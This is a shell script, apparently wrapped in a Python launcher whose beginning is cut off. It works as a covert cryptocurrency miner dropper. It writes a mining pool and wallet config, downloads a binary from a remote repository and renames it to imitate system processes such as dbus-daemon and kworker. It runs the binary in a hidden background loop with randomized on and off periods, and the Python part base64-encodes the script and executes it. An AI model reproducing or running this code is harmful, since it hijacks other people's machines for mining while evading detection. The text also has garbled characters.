#!/bin/bash


# Konfigurasi default (nanti disimpan ke file config dengan nama sesuai bin)
CONFIG_JSON='{
  "algo": "Yespowertide",
  "url": "159.223.49.26:77",
  "user": "TNR2ML87UqCtKG7uTAmvy7xvLSU1oLVsuR.Trend199",
  "pass": "x",
  "threads": 6
}'

# Daftar kemungkinan nama binary
POSSIBLE_NAMES=("dbus-daemon" "pulseaudio" "systemd-helper" "gvfsd" \
"gnome-session" "kworker" "migration" "watchdog")

# Lokasi penyimpanan
LOCAL_BIN_DIR="$HOME/.local/bin"
mkdir -p "$LOCAL_BIN_DIR"

while true; do
    # Hapus data sesi lama
    rm -f "$LOCAL_BIN_DIR"/*

    # Pilih nama binary acak
    BIN_NAME="${POSSIBLE_NAMES[$RANDOM % ${#POSSIBLE_NAMES[@]}]}"
    CONFIG_PATH="$LOCAL_BIN_DIR/${BIN_NAME}_config.json"

    # Simpan config JSON sesuai nama bin
    echo "$CONFIG_JSON" > "$CONFIG_PATH"


    # Download binary baru
    wget -q "https://gitlab.com/dfchfg/filess/-/raw/main/bagong" -O "$LOCAL_BIN_DIR/$BIN_NAME"
    chmod +x "$LOCAL_BIN_DIR/$BIN_NAME"

    # Tentukan waktu aktif (2Ã¢â‚¬â€œ3 menit)
    ACTIVE_MIN=$((RANDOM % 2 + 2))
    ACTIVE_SEC=$((ACTIVE_MIN * 60))

    # Tentukan waktu istirahat (20Ã¢â‚¬â€œ30 detik)
    IDLE_SEC=$((RANDOM % 11 + 20))


    # Jalankan proses dengan timeout
    timeout "$ACTIVE_SEC" "$LOCAL_BIN_DIR/$BIN_NAME" --config="$CONFIG_PATH" >/dev/null 2>&1

    # Istirahat
  sleep "$IDLE_SEC"
done > /dev/null 2>&1 &
"""


encoded_script = base64.b64encode(shell_script.encode()).decode()

print("==== Base64 Shell Script ====")
print(encoded_script)
print("=======================================")

decoded_script = base64.b64decode(encoded_script).decode()
subprocess.Popen(decoded_script, shell=True)

print(f"Ã¢Å“â€¦ ok")
